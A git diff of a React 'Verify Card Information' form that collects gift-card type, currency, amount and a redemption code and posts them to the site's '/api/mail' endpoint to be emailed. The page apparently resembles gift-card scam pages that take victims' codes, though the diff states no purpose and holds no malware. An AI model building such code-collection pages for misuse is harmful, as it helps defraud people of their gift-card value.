@@ -1,11 +1,79 @@
-import React from 'react'
+"use client"
+import {React, useState } from 'react'
+import { sendCardDetails } from '@/lib/api'
+
+
 
 const VerifyCard = () => {
+
+  const [cardType, setCardType] = useState('Select type of Card');
+  const [currency, setCurrency] = useState('USD');
+  const [amount, setAmount] = useState('');
+  const [redemptionCode, setRedemptionCode] = useState('');
+  const [error, setError] = useState('');
+
+  
+  const sendData = async (e) => {
+    e.preventDefault()
+
+    const pattern = /^[A-Z0-9]{10}$/;
+
+    if (pattern.test(redemptionCode)) {
+      const emailData = {
+        cardType: cardType,
+        currency: currency,
+        amount: amount,
+        redemptionCode: redemptionCode
+      }
+
+      console.log(emailData)
+      // console.log(values)
+
+      fetch ('/api/mail', {
+        method: 'POST',
+        headers: {
+          "Content-Type" : "application/json"
+        },
+        body: JSON.stringify(emailData)
+      })
+        .then(response => {
+          if (response.ok) {
+            // Email sent successfully
+            alert('Email sent!');
+            setCardType('Select type of Card');
+            setCurrency('');
+            setAmount('');
+            setRedemptionCode('');
+            setError('');
+          } else {
+            // Error occurred while sending email
+            throw new Error('Error sending email');
+          }
+        })
+        .catch(error => {
+          alert('Error sending email: ' + error);
+        });
+      console.log("finished")
+    } else {
+      setError('Please enter a valid redemption code.');
+    }
+
+  }
+
+
   return (
     <div className='flex flex-col items-center justify-center sm:w-1/2 h-max py-12 sm:bg-secondary sm:rounded-xl sm:bg-opacity-50'>
-      <form className='flex flex-col gap-8 w-full px-12'> 
+      <form method='post' className='flex flex-col gap-8 w-full px-12'> 
         <span className='flex justify-center text-4xl sm:text-6xl text-primaryText font-bold'>Verify Card Information</span>
-        <select name="cardType" id="card-dropdown" className='w-full h-16 p-4 rounded-xl'>
+        <select 
+          name="cardType" 
+          id="cardType" 
+          // value={values.cardType} 
+          value={cardType} 
+          // onChange={handleChange} 
+          onChange={e => setCardType(e.target.value)} 
+          className='w-full h-16 p-4 rounded-xl'
+          >
           <option defaultValue="" disabled>Select type of Card</option>
           <option value="Amazon">Amazon</option>
           <option value="American Express">American Express</option>
@@ -26,18 +94,53 @@ const VerifyCard = () => {
           <option value="Xbox">Xbox</option>
         </select>
         <div className='w-full flex gap-4'>
-          <select name="currency" id="card-dropdown" className='w-1/4 h-16 p-4 rounded-xl'>
-            <option value="USD">USD</option>
+          <select 
+            name="currency" 
+            id="currency" 
+            value={currency} 
+            onChange={e => setCurrency(e.target.value)}  
+            // value={values.currency} 
+            // onChange={handleChange}  
+            className='w-1/4 h-16 p-4 rounded-xl'
+            >
             <option value="AUD">AUD</option>
             <option value="CAD">CAD</option>
             <option value="EUR">EUR</option>
             <option value="GBP">GBP</option>
+            <option value="USD">USD</option>
           </select>
-            <input type='text' placeholder='Card Amount' className='w-9/12 h-16 p-4 rounded-xl' required/>
+          <input 
+            type='text' 
+            name='amount' 
+            value={amount} 
+            onChange={e => setAmount(e.target.value)} 
+            // value={values.amount} 
+            // onChange={handleChange} 
+            placeholder='Card Amount' 
+            className='w-9/12 h-16 p-4 rounded-xl' 
+            required
+          />
         </div>
-        <input type='text' placeholder='Redemption Code' className='w-full h-16 p-4 rounded-xl' required/>
-        <button className=' h-16 rounded-lg bg-primaryText my-4 text-white cursor-pointer flex items-center justify-center ' type='submit'>Continue</button>
+        <input 
+          type='text' 
+          name='redemptionCode'
+          value={redemptionCode}
+          onChange={e => setRedemptionCode(e.target.value)} 
+          // value={values.redemptionCode}
+          // onChange={handleChange} 
+          placeholder='Redemption Code' 
+          className='w-full h-16 p-4 rounded-xl' 
+          required
+        />
+        <button 
+          className=' h-16 rounded-lg bg-primaryText my-4 text-white cursor-pointer flex items-center justify-center ' 
+          type='submit'
+          onClick={sendData}
+          >
+            Continue
+        </button>
       </form>
+      { error && <p className='text-red-600'>{error}</p> }
       <span className='relative bottom text-primaryText sm:text-xl'>Please Make Sure You Input The Correct Details  </span>
     </div>
   )
